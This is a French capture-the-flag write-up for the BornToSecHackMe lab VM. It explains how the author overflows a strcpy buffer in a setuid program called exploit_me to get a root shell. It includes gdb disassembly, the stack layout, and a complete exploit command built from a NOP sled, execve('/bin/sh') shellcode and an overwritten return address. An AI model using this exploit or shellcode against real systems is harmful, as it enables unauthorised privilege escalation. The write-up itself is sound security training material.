## BONUS 5

Ici nous nous retrouvons directement log en tant que zaz.

Pour ce bonus nous allons juste exploiter le programme exploit_me d'une facon différente deux autres :

Ici nous allons remplir notre chaine de caracteres avec des NOP (0x90), puis avec un shellcode et finalement ecraser eip avec l'adresse de nos NOP.

Montons notre exploit :

```
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
(gdb) p 0x90
$1 = 144
(gdb) b*0x08048425
Breakpoint 1 at 0x8048425
(gdb) r `python -c 'print "\x90" * 140'`
Starting program: /home/zaz/exploit_me `python -c 'print "\x90" * 140'`

Breakpoint 1, 0x08048425 in main ()
(gdb) x/24xw $esp
0xbffff540:	0xbffff550	0xbffff7bc	0x00000001	0xb7ec3c49
0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff570:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff580:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff590:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb)
```

Ici nous voyons que notre chaine de NOP commence a l'adresse 0xbffff550. Nous allons donc rediriger le flux d'execution sur l'adresse 0xbffff560 pour etre sur de tomber dans notre chaine

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c 'print "\x90" * 45 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90" * 50 + "\x60\xf5\xff\xbf"'`
����������������������������������������������^�1��F�F
                                                      �
                                                       ���V
                                                            ̀1ۉ�@̀�����/bin/sh��������������������������������������������������`���
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# cd /root
# cat README
CONGRATULATIONS !!!!
To be continued...
#
```

Notre exploit est de la forme : [NOP][shellcode][NOP][addresse] pour un total de 144 caractères, eip compris.

Et voila, nous sommes root !
